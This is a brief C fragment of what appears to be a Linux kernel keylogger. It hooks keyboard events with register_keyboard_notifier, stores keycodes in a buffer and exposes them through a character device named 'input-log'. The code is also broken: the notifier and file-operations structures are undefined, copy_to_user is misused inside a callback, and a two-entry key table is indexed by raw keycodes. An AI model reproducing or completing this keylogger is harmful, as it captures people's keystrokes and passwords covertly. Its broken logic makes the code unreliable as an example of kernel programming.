#include<linux/keyboard.h>
char keys[] = {'a', 'b'};
char keysShift[] = {'A', 'B'};
char keyBuffer[512];
void observe(unsigned long kcode, struct keyboard_notifier_param *event, char *buf) {
    if (kcode == KBD_KEYCODE) {
        keyBuffer[0] = keys[event->value];
        copy_to_user(buf, keyBuffer, sizeof(keyBuffer));
    }
}
void begin(void) {
    register_keyboard_notifier(&notifier);
    register_chrdev(0, "input-log", &operations);
}
void end(void) { unregister_keyboard_notifier(&notifier); }
